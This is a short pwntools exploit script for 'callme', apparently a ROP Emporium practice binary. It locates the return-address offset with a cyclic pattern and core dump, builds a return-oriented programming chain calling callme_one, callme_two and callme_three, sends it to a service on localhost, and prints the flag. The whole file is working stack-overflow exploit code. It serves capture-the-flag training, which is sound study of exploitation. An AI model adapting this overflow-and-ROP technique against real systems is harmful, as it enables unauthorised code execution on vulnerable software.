from pwn import *

context.clear(arch="amd64")
LOCATION = "./callme"
binary = ELF(LOCATION)
rop = ROP(LOCATION)
r = remote("localhost", 1234)

def overflow():
    log.info("Finding RIP offset...")
    proc = process(LOCATION, timeout=2)
    proc.sendline(cyclic(1024, n=8))
    proc.recvall()
    core = Core("core")
    offset = cyclic_find(core.pc, n=8)
    log.success("RIP at offset {0}".format(offset))
    return 'A' * offset

def makeRop():
    rop.callme_one(1,2,3)
    rop.callme_two(1,2,3)
    rop.callme_three(1,2,3)
    return str(rop)

def exploit():
    exp  = ""
    exp += overflow()
    exp += makeRop()
    r.recvuntil('>')
    r.sendline(exp)
    log.success("Flag:" + r.recvall())

exploit()
